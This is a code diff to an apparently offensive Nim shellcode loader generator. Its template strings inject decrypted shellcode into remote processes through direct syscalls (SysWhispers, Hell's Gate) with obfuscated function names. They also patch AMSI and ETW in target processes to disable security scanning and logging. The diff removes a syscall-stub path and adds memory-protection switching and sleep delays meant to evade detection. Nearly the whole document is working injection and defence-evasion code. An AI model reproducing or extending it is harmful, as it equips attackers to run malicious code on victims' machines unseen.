@@ -7,45 +7,6 @@ let ShellcodeRemoteInjectMapSection * = """
             status: NTSTATUS
             success: BOOL
         
-        when defined(GetSyscallStub):
-        
-            when defined(DInvoke):
-                MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
-                let syscallStub_NtOpenP = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
-            else:
-                let syscallStub_NtOpenP = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
-        
-            var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
-            var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
-            var syscallStub_NtCreateSection: HANDLE = cast[HANDLE](syscallStub_NtCreate) + cast[HANDLE](SYSCALL_STUB_SIZE)
-            var syscallStub_NtMapViewOfSection: HANDLE = cast[HANDLE](syscallStub_NtCreateSection) + cast[HANDLE](SYSCALL_STUB_SIZE)
-
-            # define NtOpenProcess
-            var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
-            VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-
-            # define NtWriteVirtualMemory
-            let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
-            VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-
-            # define NtCreateThreadEx
-            let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
-            VirtualProtect(cast[LPVOID](syscallStub_NtCreate), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-            
-            # define NtCreateSection
-            let NtCreateSection = cast[myNtCreateSection](cast[LPVOID](syscallStub_NtCreateSection))
-            VirtualProtect(cast[LPVOID](syscallStub_NtCreateSection), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-
-            # define NtMapViewOfSection
-            let NtMapViewOfSection = cast[myNtMapViewOfSection](cast[LPVOID](syscallStub_NtMapViewOfSection))
-            VirtualProtect(cast[LPVOID](syscallStub_NtMapViewOfSection), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-
-            success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
-            success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
-            success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))
-            success = GetSyscallStub("NtCreateSection", cast[LPVOID](syscallStub_NtCreateSection))
-            success = GetSyscallStub("NtMapViewOfSection", cast[LPVOID](syscallStub_NtMapViewOfSection))
-        
         when defined(SysWhispers):
             when not defined(spawninject):
                 status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
@@ -54,12 +15,14 @@ let ShellcodeRemoteInjectMapSection * = """
                     echo obf("[*] NtOpenProcess: "), toHex(status)
 
             # NtCreateSection Call
-
+            
+            var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
+        
             var 
                 hMapFile: HANDLE
                 sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)
 
-            status = iuhqdihasduiahsdaksdhak(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,PAGE_EXECUTE_READWRITE,SEC_COMMIT,0)
+            status = iuhqdihasduiahsdaksdhak(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,protectionValue,SEC_COMMIT,0)
             when defined(verbose):
                 echo obf("[*] NtCreateSection: "), toHex(status)
 
@@ -85,12 +48,16 @@ let ShellcodeRemoteInjectMapSection * = """
                 echo obf("    \\-- bytes written: "), bytesWritten
                 echo obf("")
             var lpMapAddressRemote: PVOID = NULL
+            
             # NtMapViewOfSection Call remote
-            status = uihzasdbnqlpoasdlykxc(hMapFile,tProcess,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,PAGE_EXECUTE_READ)
+            when defined(RX):
+                protectionValue = PAGE_EXECUTE_READ
+            
+            status = uihzasdbnqlpoasdlykxc(hMapFile,tProcess,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,protectionValue)
             
             if (lpMapAddressRemote == nil):
                 echo obf("[-] Failed to map view of file remote")
-                echo GetLastError()
+                echo toHex(status)
             when defined(sleepinbetween):
                 HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
             ptrEncText = cast[ptr byte](lpMapAddress)
@@ -125,15 +92,15 @@ let ShellcodeRemoteInjectMapSection * = """
                         echo obf("[-] Failed to find opcode for NtCreateSection")
             
             # NtCreateSection Call
-
+            var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
+        
             var 
                 hMapFile: HANDLE
                 sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)
 
-            status = NtCreateSection(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,PAGE_EXECUTE_READWRITE,SEC_COMMIT,0)
+            status = NtCreateSection(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,protectionValue,SEC_COMMIT,0)
             when defined(verbose):
                 echo obf("[*] NtCreateSection: "), toHex(status)
-            #var hMapFile: HANDLE = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, DWORD(sc_size), NULL)            
             
             if (hMapFile == 0):
                 echo obf("[-] Failed to create file mapping")
@@ -180,13 +147,15 @@ let ShellcodeRemoteInjectMapSection * = """
                 else:
                     when defined(verbose):
                         echo obf("[-] Failed to find opcode for NtMapViewOfSection")
-
+            
+            when defined(RX):
+                protectionValue = PAGE_EXECUTE_READ
             var lpMapAddressRemote: PVOID = NULL
-            status = NtMapViewOfSection(hMapFile,tProcess,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,PAGE_EXECUTE_READ)
+            status = NtMapViewOfSection(hMapFile,tProcess,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,protectionValue)
             
             if (lpMapAddressRemote == nil):
                 echo obf("[-] Failed to map view of file remote")
-                echo GetLastError()
+                echo toHex(status)
             when defined(sleepinbetween):
                 HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)    
             ptrEncText = cast[ptr byte](lpMapAddress)
@@ -228,42 +197,7 @@ let ShellcoderemoteinjectStub * = """
             status: NTSTATUS
             success: BOOL
         
-        when defined(GetSyscallStub):
         
-            when defined(DInvoke):
-                MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
-                let syscallStub_NtOpenP = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
-            else:
-                let syscallStub_NtOpenP = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
-        
-            var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
-            var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
-            var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
-
-            # define NtOpenProcess
-            var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
-            VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);
-
-            # define NtAllocateVirtualMemory
-            let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc))
-            VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);
-
-            # define NtWriteVirtualMemory
-            let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
-            VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);
-
-            # define NtCreateThreadEx
-            let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
-            VirtualProtect(cast[LPVOID](syscallStub_NtCreate), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);
-
-            success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
-            success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc))
-            success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
-            success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))
-
-        ptrEncText = cast[ptr byte](addr encText[0])
-        ptrDecText = cast[ptr byte](addr decText[0])
-        decryptlate()
         when defined(SysWhispers):
             when not defined(spawninject):
                 status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
@@ -275,6 +209,10 @@ let ShellcoderemoteinjectStub * = """
             when defined(verbose):
                 echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
             var bytesWritten: SIZE_T
+            
+            ptrEncText = cast[ptr byte](addr encText[0])
+            ptrDecText = cast[ptr byte](addr decText[0])
+            decryptlate()
 
             status = oqiazasusjk(tProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)
 
@@ -282,16 +220,29 @@ let ShellcoderemoteinjectStub * = """
                 echo obf("[*] NtWriteProcessMemory: "), toHex(status)
                 echo obf("    \\-- bytes written: "), bytesWritten
                 echo obf("")
-            #ptrEncText = cast[ptr byte](ds)
-            #ptrDecText = cast[ptr byte](ds)
-            #decryptlate()
-            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,ds,NULL, FALSE, 0, 0, 0, NULL)
+            
+            when defined(RX):
+                when defined(sleepinbetween):
+                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+                status = uashdiasdj(tProcess,&ds,&sc_size,PAGE_EXECUTE_READ,addr oldProtection)
+                when defined(verbose):
+                    echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
+                    if (status == 0):
+                        echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
+                if(status != 0):
+                    quit(1)
 
+            when not defined(RX):
+                when defined(sleepinbetween):
+                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+            
+
+            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,ds,NULL, FALSE, 0, 0, 0, NULL)
+            when defined(verbose):
+                echo obf("[*] NtCreateThreadEx: "), toHex(status)
             status = zuatzuastdiasyy(tHandle)
             status = zuatzuastdiasyy(tProcess)
-
-            when defined(verbose):
-                echo success
+ 
         else:
 
             when defined(Hellsgate):
@@ -312,8 +263,16 @@ let ShellcoderemoteinjectStub * = """
                 else:
                     when defined(verbose):
                         echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+            
 
-            status = NtAllocateVirtualMemory(tProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
+            var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
+        
+            when defined(RX):
+                protectionValue = PAGE_READWRITE
+            when defined(RWX):
+                protectionValue = PAGE_EXECUTE_READWRITE
+
+            status = NtAllocateVirtualMemory(tProcess, &ds, 0, &sc_size,MEM_COMMIT,protectionValue)
             when defined(verbose):
                 echo obf("[*] NtAllocateVirtualMemory: "), status
             var bytesWritten: SIZE_T
@@ -324,6 +283,13 @@ let ShellcoderemoteinjectStub * = """
                 else:
                     when defined(verbose):
                         echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+            
+            when defined(sleepinbetween):
+                HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+
+            ptrEncText = cast[ptr byte](addr encText[0])
+            ptrDecText = cast[ptr byte](addr decText[0])
+            decryptlate()
 
             status = NtWriteVirtualMemory(
                 tProcess, 
@@ -336,16 +302,36 @@ let ShellcoderemoteinjectStub * = """
                 echo obf("[*] NtWriteVirtualMemory: "), status
                 echo obf("    \\-- bytes written: "), bytesWritten
                 echo obf("")
-        
+            
+            when defined(RX):
+                when defined(Hellsgate):
+                    if getSyscall(ntProtectTable):
+                        syscall = ntProtectTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                when defined(sleepinbetween):
+                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+                
+                status = NtProtectVirtualMemory(tProcess, &ds, &sc_size, PAGE_EXECUTE_READ, addr oldProtection)
+                when defined(verbose):
+                    echo obf("[*] NtProtectVirtualMemory: "), status
+                    if (status == 0):
+                        echo obf("[+] Permissions changed to PAGE_EXECUTE_READ")
+                if(status != 0):
+                    quit(1)
+            
+            when not defined(RX):
+                when defined(sleepinbetween):
+                    HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
+
             when defined(Hellsgate):
                 if getSyscall(ntCreateTable):
                     syscall = ntCreateTable.wSysCall
                 else:
                     when defined(verbose):
                         echo obf("[-] Failed to find opcode for NtCreateThreadEx")
-            #ptrEncText = cast[ptr byte](ds)
-            #ptrDecText = cast[ptr byte](ds)
-            #decryptlate()
+            
             status = NtCreateThreadEx(
                 &tHandle, 
                 THREAD_ALL_ACCESS, 
@@ -353,7 +339,10 @@ let ShellcoderemoteinjectStub * = """
                 tProcess,
                 ds, 
                 NULL, FALSE, 0, 0, 0, NULL)
-        
+            
+            when defined(verbose):
+                echo obf("[*] NtCreateThreadEx: "), toHex(status)
+
             when defined(Hellsgate):
                 if getSyscall(ntCloseTable):
                     syscall = ntCloseTable.wSysCall
@@ -364,8 +353,6 @@ let ShellcoderemoteinjectStub * = """
             status = NtClose(tHandle)
             status = NtClose(tProcess)
 
-            when defined(verbose):
-                echo success
     
 
     injectCreateRemoteThread(dectext) # later on to be changed to enctext when decrypting after NtWriteVirtualMemory
@@ -522,26 +509,6 @@ let RemotePatchAMSIStub* = """
 
         else:
 
-            when defined(GetSyscallStub):
-                var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
-
-                # Define NtProtectVirtualMemory
-                var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
-                when defined(DInvoke):
-                    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-                else:
-                    success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-                # define NtWriteVirtualMemory
-                let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
-                when defined(DInvoke):
-                    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-                else:
-                    success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-                
-                success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
-                success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
-
-
             when defined(Hellsgate):
                 if getSyscall(ntProtectTable):
                     syscall = ntProtectTable.wSysCall
@@ -686,47 +653,7 @@ let RemoteLoadAMSIStub* = """
             else:
                 return false
         else:
-
-            when defined(GetSyscallStub):
-                when defined(DInvoke):
-                    var pHandle2: HANDLE = -1
-                    MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
-                    let syscallStub_NtOpenP = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
-                else:
-                    let pHandle2 = -1
-                    let syscallStub_NtOpenP = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
-
-        
-                var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
-                var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
-                var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
-
-
-                var oldProtection: DWORD = 0
-
-                # define NtOpenProcess
-                var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
-                VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
-
-                # define NtAllocateVirtualMemory
-                let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc))
-                VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
-
-                # define NtWriteVirtualMemory
-                let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
-                VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
-
-                # define NtCreateThreadEx
-                let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
-                VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
-
-                var success: BOOL
-
-                success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
-                success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc))
-                success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
-                success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))
-
+            
             when defined(Hellsgate):
                 if getSyscall(ntOpenTable):
                     syscall = ntOpenTable.wSysCall
@@ -800,16 +727,7 @@ let RemoteLoadAMSIStub* = """
                 return true
             else:
                 return false
-            when defined(GetSyscallStub):
-                # This doesn't work so far for some reason
-                when defined(DInvoke):
-                    success = MyVirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
-                else:
-                    success = VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
-                if (success):
-                    when defined(verbose):
-                        echo obf("set back old protect")
-                        echo success
+
 
 """
 
@@ -852,7 +770,7 @@ let RemotePatchETWStub* = """
             buffer          : LPVOID
 
         when defined(SysWhispers):
-            status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+            status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                     
             if not NT_SUCCESS(status):
                 when defined(verbose):
@@ -885,26 +803,6 @@ let RemotePatchETWStub* = """
             return disabled
 
         else:
-
-            when defined(GetSyscallStub):
-                var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
-
-                # Define NtProtectVirtualMemory
-                var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
-                when defined(DInvoke):
-                    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-                else:
-                    success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-                # define NtWriteVirtualMemory
-                let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
-                when defined(DInvoke):
-                    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-                else:
-                    success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-                
-                success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
-                success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
-
 
             when defined(Hellsgate):
                 if getSyscall(ntProtectTable):
@@ -971,20 +869,6 @@ let RemotePatchETWStub* = """
             when not defined(spawninject):
                 status = opqiwepoausdasdjl(&hProcss,PROCESS_ALL_ACCESS,&oa, &cid)
         else:
-            when defined(GetSyscallStub):
-                when defined(DInvoke):
-                    MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
-                
-                    MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
-                    let syscallStub_NtOpenP2 = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
-                else:
-                    let syscallStub_NtOpenP2 = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
-                var oldProtection: DWORD = 0
-                # define NtOpenProcess
-                var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP2))
-                VirtualProtect(cast[LPVOID](syscallStub_NtOpenP2), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
-                success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP2))
-        
             when defined(Hellsgate):
                 if getSyscall(ntOpenTable):
                     syscall = ntOpenTable.wSysCall
@@ -1069,49 +953,7 @@ let RemoteLoadNTDLLStub* = """
             else:
                 return false
         else:
-
-            when defined(GetSyscallStub):
-                when defined(DInvoke):
-                    MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
-                    var pHandle2: HANDLE = -1
-
-                    MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
-                    let syscallStub_NtOpenP = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
-                else:
-                    let pHandle2 = -1
-                    let syscallStub_NtOpenP = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
-
-        
-                var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
-                var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
-                var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
-
-
-                var oldProtection: DWORD = 0
-
-                # define NtOpenProcess
-                var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
-                VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
-
-                # define NtAllocateVirtualMemory
-                let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc))
-                VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
-
-                # define NtWriteVirtualMemory
-                let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
-                VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
-
-                # define NtCreateThreadEx
-                let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
-                VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
-
-                var success: BOOL
-
-                success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
-                success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc))
-                success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
-                success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))
-
+           
             when defined(Hellsgate):
                 if getSyscall(ntOpenTable):
                     syscall = ntOpenTable.wSysCall
@@ -1188,15 +1030,6 @@ let RemoteLoadNTDLLStub* = """
                 return true
             else:
                 return false
-            when defined(GetSyscallStub):
-                # This doesn't work so far for some reason
-                when defined(DInvoke):
-                    success = MyVirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
-                else:
-                    success = VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
-                if (success):
-                    when defined(verbose):
-                        echo obf("set back old protect")
-                        echo success
+            
 
 """
